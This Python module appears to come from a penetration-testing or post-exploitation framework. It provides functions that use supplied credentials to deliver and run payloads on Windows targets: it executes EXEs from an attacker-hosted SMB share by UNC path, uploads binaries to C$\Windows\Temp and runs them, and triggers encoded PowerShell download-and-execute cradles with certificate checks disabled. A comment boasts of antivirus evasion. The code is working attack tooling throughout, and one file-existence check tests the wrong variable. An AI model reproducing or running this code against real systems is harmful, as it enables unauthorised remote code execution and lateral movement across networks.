"""

Payload-delivery methods.

Includes:

    hostTrigger()               - host an EXE and trigger it by UNC on a target
    uploadTrigger()             - upload and trigger and EXE
    powershellTrigger()         - trigger a download/execute of a powershell script from a particular powershell
    powershellHostTrigger()     - host a powershell script on a HTTP server and trigger a download/execute

"""

import os, time

from lib import helpers
from lib import smb
from lib import http
from lib import command_methods

import settings


def hostTrigger(targets, username, password, exePath, localHost, triggerMethod="wmis", exeArgs=""):
    """
    Spins up an Impacket SMB server and hosts the binary specified by exePath.
    The specified triggerMethod (default wmis) is then used to invoke a command
    with the UNC path "\\localHost\\exe" which will invoke the specified
    executable purely in memory.

    Note: this evades several AV vendors, even with normally disk-detectable
    executables #avlol :)

    This takes 'targets' instead of a single 'target' since we don't want to set up
    and tear down the local SMB server every time.
    """

    # if we get a single target, make it into a list
    if type(targets) is str:
        targets = [targets]

    # randomize the hosted .exe file name
    hostedFileName = helpers.randomString() + ".exe"

    # make the tmp hosting directory if it doesn't already exist
    if not os.path.exists(settings.TEMP_DIR + "shared/"): 
        os.makedirs(settings.TEMP_DIR + "shared/")

    # copy the payload to the random hostedFileName in the temp directory
    os.system("cp "+exePath+" /"+settings.TEMP_DIR+"/shared/" + hostedFileName)

    # spin up the SMB server 
    server = smb.ThreadedSMBServer()
    server.start()
    time.sleep(.5)

    # build the UNC path back to our host and executable and any specified arguments
    cmd = "\\\\" + localHost + "\\system\\" + hostedFileName+" "+exeArgs

    for target in targets:
        # execute the UNC command for each target
        command_methods.executeCommand(target, username, password, cmd, triggerMethod)

    print helpers.color("\n [*] Giving time for commands to trigger...")
    # sleep so the wmis/winexe commands can trigger and the target
    # can grab the .exe from the SMB server
    time.sleep(10)

    # shut the smb server down
    server.shutdown()

    # remove the temporarily hosted files
    os.system("rm -rf " + settings.TEMP_DIR+"/shared/")

    # not sure if need to do this to kill off the smb server...
    # os.kill(os.getpid(), signal.SIGINT) ?

    # return the randomized name in the calling method later wants
    # to clean the processes up
    return hostedFileName


def uploadTrigger(targets, username, password, exePath, triggerMethod="wmis", exeArgs=""):
    """
    Take a particular exe at "exePath" path and uploads it to each 
    target in targets, using the specified username and password.

    The specified triggerMethod (default wmis) is then used to trigger the
    uploaded executable.

    """

    # if we get a single target, make it into a list
    if type(targets) is str:
        targets = [targets]

    # randomize the uploaded .exe file name
    uploadFileName = helpers.randomString() + ".exe"

    # copy the payload to the random hostedFileName in the temp directory
    os.system("cp "+exePath+" /"+settings.TEMP_DIR+"/"+uploadFileName)

    # command to trigger the uploaded executable
    cmd = "C:\\Windows\\Temp\\"+uploadFileName+" "+exeArgs

    for target in targets:
        # upload the binary to the host at C:\Windows\Temp\
        smb.uploadFile(target, username, password, "C$", "\\Windows\\Temp\\", settings.TEMP_DIR+"/"+uploadFileName, 5)
        
        # execute the trigger command
        command_methods.executeCommand(target, username, password, cmd, triggerMethod)

    # return the randomized name in the calling method later wants
    # to clean the processes up
    return uploadFileName


def powershellTrigger(targets, username, password, url, scriptArguments="", triggerMethod="wmis", outFile=None, noArch=False):
    """
    Trigger a specific url to download a powershell script from.

    url                 - the full url (http/https) to download the second stage script from
    scriptArguments     - the arguments to pass to the script we're invoking
    outFile             - if you want to the script to output to a file for later retrieval, put a path here
    noArch              - don't do the arch-independent launcher
    """

   # this surpasses the length-limit implicit to smbexec I'm afraid :(
    if triggerMethod.lower() == "smbexec":
        print helpers.color("\n\n [!] Error: smbexec will not work with powershell invocation",warning=True)
        raw_input(" [*] press any key to return: ")
        return ""

    # if we get a single target, make it into a list
    if type(targets) is str:
        targets = [targets]

    # if the url doesn't start with http/https, assume http
    if not url.lower().startswith("http"):
        url = "http://" + url

    if scriptArguments.lower() == "none": scriptArguments = ""

    # powershell command to download/execute our secondary stage,
    #   plus any scriptArguments we want to tack onto execution (i.e. PowerSploit)
    # for https, be sure to turn off warnings for self-signed certs in case we're hosting
    if url.lower().startswith("https"):
        downloadCradle = "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (New-Object Net.WebClient).DownloadString('"+url+"');"+scriptArguments
        
    else:
        downloadCradle = "IEX (New-Object Net.WebClient).DownloadString('"+url+"');"+scriptArguments

    # get the encoded powershell command
    triggerCMD = helpers.encPowershell(downloadCradle, noArch=noArch)

    # if we want to get output from the final execution, append it
    if outFile: triggerCMD += " > " + outFile

    # execute the powershell trigger command on each target
    for target in targets:
        print "\n [*] Executing command on "+target
        out = command_methods.executeCommand(target, username, password, triggerCMD, triggerMethod)


def powershellHostTrigger(targets, username, password, secondStage, lhost, scriptArguments="", triggerMethod="wmis", extraFiles=[], outFile=None, ssl=False, noArch=False):
    """
    Hosts the 'secondaryStage' powershell script on a temporary web server,
    and triggers the "IEX (New-Object Net.WebClient).DownloadString(...)" cradle
    to download and invoke the secondStage.

    Inspiration from http://www.pentestgeek.com/2013/09/18/invoke-shellcode/

    lhost               - local host IP to trigger the secondary stage from
    secondStage         - path to a secondary Powershell payload stage
    scriptArguments     - additional powershell command to run right after the secondStage download 
                            i.e. for PowerSploit arguments
    extraFiles          - additional files to host (i.e. an exe)
    outFile             - if you want to retrieve the results of the final execution
    ssl                 - use https/ssl for the trigger
    noArch              - don't do the arch-independent launcher

    Inspiration from http://www.pentestgeek.com/2013/09/18/invoke-shellcode/

    """

    # this surpasses the length-limit implicit to smbexec I'm afraid :(
    if triggerMethod.lower() == "smbexec":
        print helpers.color("\n\n [!] Error: smbexec will not work with powershell invocation",warning=True)
        raw_input(" [*] press any key to return: ")
        return ""

    # sanity check that the second powershell stage actually exists
    if not os.path.exists(secondStage):
        print helpers.color("\n\n [!] Error: second powershell stage '"+secondStage+"' doesn't exist!", warning=True)
        raw_input(" [*] press any key to return: ")
        return ""

    # translate string to boolean for ssl
    if ssl and isinstance(ssl, str):
        if ssl.lower()=="true": ssl = True
        else: ssl = False

    # get a randomized name for our second stage
    secondStageName = helpers.randomString()

    # if we're using ssl/https to host, throw in the self-signed cert
    # note: this also cleanr out the host directory, /tmp/pillage/ !
    if ssl:
        certPath = settings.VEIL_PILLAGE_PATH + "/data/misc/key.pem"
        # create our Veil HTTPS server for serving /tmp/pillage/
        server = http.VeilHTTPServer(port=443, cert=certPath)
        # append https to the local host
        url = "https://" + lhost + "/" + secondStageName
    else:
        # create our Veil HTTP server for serving /tmp/pillage/
        server = http.VeilHTTPServer()
        url = "http://" + lhost + "/" + secondStageName

    # copy the second stage into the randomized name in /tmp/pillage/
    os.system("cp " + secondStage + " /tmp/pillage/"+secondStageName)

    # start the http server up
    server.start()
    time.sleep(.5)

    # copy in any extra files to host (i.e. if we're doing remote reflective exe invocation or something)
    for f in extraFiles:
        if not os.path.exists(secondStage):
            print helpers.color(" [!] Error: addtional file '"+f+"' doesn't exist!", warning=True)
        else:
            os.system("cp " + f + " /tmp/pillage/")

    # call the general powershell trigger method with the appropriate url
    powershellTrigger(targets, username, password, url, scriptArguments, triggerMethod, outFile, noArch)

    # pause for a bit, and the shut the server down
    print helpers.color("\n [*] Giving time for commands to trigger...")
    time.sleep(10)
    server.shutdown()

